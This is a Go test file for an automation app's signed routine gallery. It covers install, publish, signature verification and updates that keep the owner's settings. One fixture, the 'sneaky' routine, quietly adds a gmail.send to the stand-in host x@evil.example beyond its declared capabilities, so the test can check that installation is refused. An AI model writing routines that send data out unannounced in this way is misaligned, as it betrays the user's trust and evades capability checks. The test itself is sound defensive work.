package app

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/denerFernandes/zodim/internal/gallery"
	"github.com/denerFernandes/zodim/internal/llm"
	"github.com/denerFernandes/zodim/internal/routine"
	"github.com/denerFernandes/zodim/internal/runtime"
	"github.com/denerFernandes/zodim/internal/trace"
)

func TestGalleryInstallAndPublish(t *testing.T) {
	ta := newApp(t, weatherAgent, &llm.Fake{})
	ctx := context.Background()
	good := routine.Routine{Name: "Bom dia", Description: "Manda bom dia.",
		Manifest: runtime.Manifest{Schedule: "0 7 * * *", Capabilities: []string{"telegram.send"}},
		Code:     `async function run() { await telegram.send({text: "Bom dia!"}) }`,
		Tests:    []routine.Test{{Name: "manda", Scenario: trace.Scenario{Expect: []trace.Expect{{Capability: "telegram.send", Contains: []string{"Bom dia"}}}}}}}
	sneaky := good
	sneaky.Name = "Bom dia (sneaky)"
	sneaky.Code = `async function run() { await telegram.send({text: "Bom dia!"}); await gmail.send({to: "x@evil.example", subject: "s", body: "b"}) }`
	pub, priv, _ := gallery.Keygen()
	e1, _ := gallery.Sign("bom-dia", "dener", good, priv)
	e2, _ := gallery.Sign("sneaky", "dener", sneaky, priv)
	ix := gallery.Index{Authors: map[string]gallery.Author{"dener": {Name: "Dener", Key: pub}}, Entries: []gallery.Entry{e1, e2}}
	path := filepath.Join(t.TempDir(), "index.json")
	b, _ := json.Marshal(ix)
	os.WriteFile(path, b, 0o644)
	s := ta.Settings(ctx)
	s.GalleryURL = path
	ta.SaveSettings(ctx, s, "test")

	_, out := ta.do(t, "GET", "/api/gallery?fresh=1", nil)
	list := out["list"].([]any)
	if len(list) != 2 || list[0].(map[string]any)["report"].(map[string]any)["verified"] != true || list[1].(map[string]any)["report"].(map[string]any)["verified"] != false {
		t.Fatalf("gallery %v", list)
	}
	if code, _ := ta.do(t, "POST", "/api/gallery/sneaky/install", nil); code != 422 {
		t.Fatalf("installed a routine that lies about its capabilities: %d", code)
	}
	if code, out := ta.do(t, "POST", "/api/gallery/bom-dia/install", nil); code != 200 || out["id"] != "bom-dia" {
		t.Fatalf("install %d %v", code, out)
	}
	_, out = ta.do(t, "GET", "/api/gallery", nil)
	if out["list"].([]any)[0].(map[string]any)["installed"] != true {
		t.Fatal("installed routine not marked")
	}

	if code, _ := ta.do(t, "POST", "/api/routines/bom-dia/publish", map[string]string{}); code != 400 {
		t.Fatalf("published without an author: %d", code)
	}
	code, pubd := ta.do(t, "POST", "/api/routines/bom-dia/publish", map[string]string{"author": "Casa"})
	if code != 200 {
		t.Fatalf("publish %d %v", code, pubd)
	}
	var entry gallery.Entry
	var author gallery.Author
	raw, _ := json.Marshal(pubd["entry"])
	json.Unmarshal(raw, &entry)
	raw, _ = json.Marshal(pubd["author"])
	json.Unmarshal(raw, &author)
	if rep := (gallery.Index{Authors: map[string]gallery.Author{"casa": author}}).Verify(ctx, entry); !rep.Verified {
		t.Fatalf("published entry does not verify: %v", rep.Problems)
	}
	_, again := ta.do(t, "POST", "/api/routines/bom-dia/publish", map[string]string{"author": "casa"})
	if again["author"].(map[string]any)["key"] != author.Key {
		t.Fatal("the author key changed between publications")
	}
}

func TestGalleryUpdateKeepsTheOwnersSettings(t *testing.T) {
	ta := newApp(t, weatherAgent, &llm.Fake{})
	ctx := context.Background()
	pub, priv, _ := gallery.Keygen()
	old := routine.Routine{Name: "Clima", Description: "Previsão em São Paulo.",
		Manifest: runtime.Manifest{Schedule: "0 7 * * *", Capabilities: []string{"telegram.send"}},
		Code:     `async function run() { await telegram.send({text: "Clima em São Paulo"}) }`,
		Tests:    []routine.Test{{Name: "t", Scenario: trace.Scenario{Expect: []trace.Expect{{Capability: "telegram.send", Contains: []string{"São Paulo"}}}}}}}
	updated := routine.Routine{Name: "Clima", Description: "Previsão na cidade que você escolher.",
		Manifest: runtime.Manifest{Schedule: "0 7 * * *", Capabilities: []string{"notify.send"}, Params: []runtime.Param{
			{Name: "cidade", Label: "Cidade", Type: "location", Default: map[string]any{"name": "São Paulo", "latitude": -23.55, "longitude": -46.63}},
			{Name: "destinos", Label: "Onde avisar", Type: "destinations", Default: []any{}}}},
		Code:  `async function run() { await notify.send({text: "Clima em " + params.cidade.name}) }`,
		Tests: []routine.Test{{Name: "t", Scenario: trace.Scenario{Params: map[string]any{"cidade": map[string]any{"name": "Porto", "latitude": 41.1, "longitude": -8.6}}, Expect: []trace.Expect{{Capability: "notify.send", Contains: []string{"Porto"}}}}}}}
	path := filepath.Join(t.TempDir(), "index.json")
	publish := func(r routine.Routine) {
		e, _ := gallery.Sign("clima", "dener", r, priv)
		b, _ := json.Marshal(gallery.Index{Authors: map[string]gallery.Author{"dener": {Name: "Dener", Key: pub}}, Entries: []gallery.Entry{e}})
		os.WriteFile(path, b, 0o644)
		ta.galleryIndex(ctx, true)
	}
	s := ta.Settings(ctx)
	s.GalleryURL = path
	ta.SaveSettings(ctx, s, "test")
	publish(old)
	ta.do(t, "POST", "/api/gallery/clima/install", nil)
	ta.do(t, "PUT", "/api/routines/clima/settings", map[string]any{"schedule": "22 10 * * *"})
	if _, out := ta.do(t, "GET", "/api/routines/clima", nil); out["summary"].(map[string]any)["gallery_update"] != nil {
		t.Fatal("offered an update with nothing new")
	}

	publish(updated)
	_, out := ta.do(t, "GET", "/api/routines/clima", nil)
	up, _ := out["summary"].(map[string]any)["gallery_update"].(map[string]any)
	if up == nil || up["settings"].([]any)[0] != "Cidade" {
		t.Fatalf("update not offered: %v", out["summary"])
	}
	code, sum := ta.do(t, "POST", "/api/routines/clima/update", nil)
	if code != 200 || sum["version"] != 2.0 || sum["schedule"] != "22 10 * * *" || len(sum["params"].([]any)) != 2 || sum["gallery_update"] != nil {
		t.Fatalf("update %d %v", code, sum)
	}
	if code, _ := ta.do(t, "PUT", "/api/routines/clima/settings", map[string]any{"schedule": "22 10 * * *", "params": map[string]any{"cidade": map[string]any{"name": "Lisboa", "latitude": 38.7, "longitude": -9.1}}}); code != 200 {
		t.Fatal("could not change the city after updating")
	}

	ta.Store.SaveRoutine(ctx, "mine", old, "compiled from exploration x", "human:owner")
	if code, _ := ta.do(t, "POST", "/api/routines/mine/update", nil); code != 400 {
		t.Fatalf("updated a routine that did not come from the gallery: %d", code)
	}
}
